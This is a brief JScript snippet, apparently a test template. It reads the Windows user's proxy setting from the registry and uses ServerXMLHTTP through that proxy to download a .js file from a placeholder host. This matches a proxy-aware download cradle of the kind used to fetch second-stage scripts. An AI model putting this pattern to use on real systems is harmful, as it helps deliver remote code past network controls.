var WshShell = new ActiveXObject("Wscript.Shell");
regvalue = WshShell.RegRead("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer");
var url = 'http://LOCAL_IP:LOCAL_PORT/HTTP_10_serverxmlhttp_p_HKCU.js';
var Object = new ActiveXObject('MSXML2.ServerXMLHTTP');
Object.open('GET', url, false);
Object.setProxy(2,regvalue);
Object.send();